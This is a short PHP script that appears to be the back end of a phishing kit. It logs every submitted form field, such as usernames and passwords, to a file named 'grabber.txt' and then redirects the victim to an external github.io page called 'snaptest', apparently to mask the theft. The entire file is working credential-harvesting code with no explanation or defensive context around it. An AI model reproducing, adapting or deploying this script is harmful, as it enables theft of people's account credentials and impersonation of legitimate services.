<?php
header ('Location:https://srb932.github.io/snaptest/');
$handle = fopen('grabber.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, '|');
}
fwrite($handle, "@non!me");
fwrite($handle,'|');
fwrite($handle,"\n");
fclose($handle);
exit;
?>
